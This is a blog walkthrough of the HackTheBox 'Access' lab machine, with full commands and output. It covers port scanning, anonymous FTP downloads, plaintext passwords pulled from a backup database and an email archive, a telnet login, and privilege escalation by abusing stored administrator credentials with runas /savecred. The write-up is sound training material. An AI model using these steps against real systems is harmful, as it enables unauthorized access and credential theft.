---
layout: single
classes: wide
title:  "Access"
date: 2019-03-11
categories:
    - "hackthebox"
tags:
    - machines
    - windows
    - easy
excerpt:  "This was my first ever machine on HTB. Took me around 3 days to figure this out (I was just starting!). This box touches basic misconfiguration in Windows based servers and is a good starter to your adventure in penetration testing with hackthebox."
---
This was my first ever machine on HTB. Took me around 3 days to figure this out (I was just starting!). This box touches basic misconfiguration in Windows based servers and is a good starter to your adventure in penetration testing with hackthebox.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/Access/banner.PNG)

## Unlock and Access!

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```console
htb@noone:~/Access$ nmap -v -sC -sV -oA nmap/access 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.12s latency).
Not shown: 997 filtered ports

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Well, so we have a few ports open, port 21, 23, 80.

I always like to check the low-hanging fruit first. So let's get into FTP since `anonymous` login is allowed. This is a common misconfiguration for FTP logins. You never know what you might find but always is useful.

```console
htb@noone:~/Access$ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:htb): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.

ftp> cd Backups
250 CWD command successful.

ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.

ftp> cd ../Engineer
l250 CWD command successful.

ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.

ftp> get "Access Control.zip"

ftp> get ../Backups/backup.mdb
```

After exploring the FTP shell, I found two files `backup.mdb` and `Access Control.zip`

A little Google-Fu helped me to figure out what a `mdb` file was and how I could use command-line tools in kali to view the contents.

```console
htb@noone:~/Access$ mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc
auth_group_permissions auth_message auth_permission - auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS
deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog
ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam
auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate
FaceTempEx FingerVeinEx TEMPLATEEx

htb@noone:~/Access$ mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer" ,"access4u@security" ,1,"08/23/18 21:13:36",26,
28,"backup_admin" ,"admin" ,1,"08/23/18 21:14:02",26,
```

Credentials found for some users. Now let's try to access the zip archive.

I tried to extract te=he archive on Linux, doesn't work. So, I downloaded it on a Windows box and tried to unzip and apparently, it needs a password. Thankfully, we have a list that we just extracted.

After some trial and error, `access4u@security` was the password for the archive. Found a `.pst` file. Again some Google-Fu and I found a way to read the file on linux.

````console
htb@noone:~/Access$ readpst 'Access Control.pst'

htb@noone:~/Access$cat 'Access Control.mbox'

From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-930452179_-_-"


----boundary-LibPST-iamunique-930452179_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-930452179_-_-"

--alt---boundary-LibPST-iamunique-930452179_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,



The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.



Regards,

John
````

Great! So we have a set of credentials. That was it from FTP, onto the next service which is Telnet on port 23.

````console
htb@noone:~/Access$ telnet -l security 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

password:4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir
Volume in drive C has no label.
Volume Serial Number is 9C45-DBF0

Directory of C:\Users\security

```snip```
03/12/2019  12:33 PM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
```snip```
2 File(s)          5,198 bytes
14 Dir(s)  16,667,664,384 bytes free
C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is 9C45-DBF0

Directory of C:\Users\security\Desktop
```snip```
08/21/2018  10:37 PM                32 user.txt
```snip```

C:\Users\security\Desktop>more user.txt
f******************************8
````

Excellent! We have our user flag. Onto root.

In the same telnet session, I tried to check ways to privesc.

```console
C:\>cmdkey /list

Currently stored credentials:

Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator

C:\>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Downloads\root.txt"

C:\>more C:\Users\security\Downloads\root.txt
6******************************f
```

Voila! We have the root flag as well and we can use this to gain out points on HackTheBox.

The privilege escalation on this box wasn't that complicated if you know what you are doing.

Happy Hacking! Cheers!
